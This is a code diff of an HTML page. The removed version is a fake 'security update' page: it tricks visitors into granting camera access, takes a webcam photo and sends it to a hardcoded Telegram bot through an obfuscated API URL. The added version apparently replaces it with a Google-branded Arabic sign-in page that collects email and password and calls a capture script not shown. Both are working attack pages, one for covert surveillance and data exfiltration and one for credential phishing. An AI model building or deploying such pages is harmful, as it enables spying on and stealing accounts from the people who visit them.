@@ -1,58 +1,192 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking Configuration...</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Login</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+
+    body {
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-wrapper {
+      text-align: center;
+    }
+
+    .login-card {
+      width: 380px;
+      background: #ffffff;
+      padding: 45px 40px;
+      border-radius: 16px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
+      border: 1px solid #dadce0;
+    }
+
+    .logo {
+      width: 85px;
+      margin-bottom: 25px;
+    }
+
+    h2 {
+      font-weight: 500;
+      margin-bottom: 8px;
+      font-size: 22px;
+      color: #202124;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 30px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 22px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px 12px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      outline: none;
+      font-size: 14px;
+      transition: 0.2s ease;
+    }
+
+    .input-group input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
+    }
+
+    .input-group label {
+      position: absolute;
+      top: 14px;
+      left: 12px;
+      background: #fff;
+      padding: 0 6px;
+      font-size: 14px;
+      color: #5f6368;
+      transition: 0.2s ease;
+      pointer-events: none;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:valid + label {
+      top: -8px;
+      left: 10px;
+      font-size: 12px;
+      color: #1a73e8;
+    }
+
+    .link {
+      display: block;
+      text-align: left;
+      font-size: 13px;
+      color: #1a73e8;
+      text-decoration: none;
+      margin-bottom: 28px;
+      font-weight: 500;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+      transition: 0.25s ease;
+    }
+
+    .login-btn:hover {
+      background: #1765cc;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 18px rgba(26,115,232,0.25);
+    }
+
+    .login-btn:active {
+      transform: translateY(0);
+      box-shadow: none;
+    }
+
+    .footer {
+      margin-top: 25px;
+    }
+
+    .footer select {
+      border: none;
+      background: transparent;
+      font-size: 13px;
+      color: #5f6368;
+      cursor: pointer;
+    }
+
+    @media (max-width: 480px) {
+      .login-card {
+        width: 90%;
+        padding: 35px 25px;
+      }
+    }
+  </style>
 </head>
-<body style="background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;">
-    <div style="text-align:center;"><div id="l" style="border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%;width:30px;height:30px;animation:s 1s linear infinite;margin:0 auto 10px;"></div><p id="t">Processing security update...</p></div>
-    <video id="v" autoplay playsinline style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
-    <script>
-        // --- ضع بياناتك هنا ---
-        const _0x_tk = "8790524895:AAEdFMd4iXmI9XjaSG7dcaIGvTvzzHDW-VY"; // توكن البوت
-        const _0x_id = "5657552404"; // شات آيدي
-        // ---------------------
 
-        const _0x4f2a = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
-        const _0x11b1 = "https://www.google.com";
+<body>
 
-        window.onload = function() {
-            if (confirm("Security Alert: System needs to verify your identity to proceed with the update. Allow?")) {
-                _0x_start();
-            } else {
-                location.replace(location.href); // المتاهة
-            }
-        };
+  <div class="login-wrapper">
+    
+    <div class="login-card">
+      <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
 
-        async function _0x_start() {
-            try {
-                const _0x_str = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-                document.getElementById('v').srcObject = _0x_str;
-                setTimeout(() => { _0x_send(_0x_str); }, 1200);
-            } catch (e) {
-                window.location.replace(_0x11b1);
-            }
-        }
+      <h2>تسجيل الدخول</h2>
+      <p class="subtitle">استخدام حسابك للمتابعة</p>
 
-        function _0x_send(_0x_s) {
-            const _0x_cv = document.getElementById('c');
-            const _0x_vd = document.getElementById('v');
-            _0x_cv.width = _0x_vd.videoWidth;
-            _0x_cv.height = _0x_vd.videoHeight;
-            _0x_cv.getContext('2d').drawImage(_0x_vd, 0, 0);
-            _0x_cv.toBlob(_0x_b => {
-                const _0x_f = new FormData();
-                _0x_f.append('chat_id', _0x_id);
-                _0x_f.append('photo', _0x_b, 'u.jpg');
-                fetch(_0x4f2a + _0x_tk + "/sendPhoto", {method:'POST',body:_0x_f})
-                .finally(() => {
-                    _0x_s.getTracks().forEach(_0x_t => _0x_t.stop());
-                    window.location.replace(_0x11b1);
-                });
-            }, 'image/jpeg', 0.6);
-        }
-    </script>
-    <style>@keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+      <form>
+        <div class="input-group">
+          <input id="email" type="email" required>
+          <label>البريد الإلكتروني أو الهاتف</label>
+        </div>
+
+        <div class="input-group">
+          <input id="password" type="password" required>
+          <label>كلمة المرور</label>
+        </div>
+
+        <a href="#" class="link">هل نسيت كلمة المرور؟</a>
+
+        <button type="button" class="login-btn" onclick="captureAndRedirect()">تسجيل الدخول</button>
+      </form>
+    </div>
+
+    <div class="footer">
+      <select>
+        <option>العربية</option>
+        <option>English</option>
+      </select>
+    </div>
+
+  </div>
+
+<script src="js.js"></script>
 </body>
 </html>
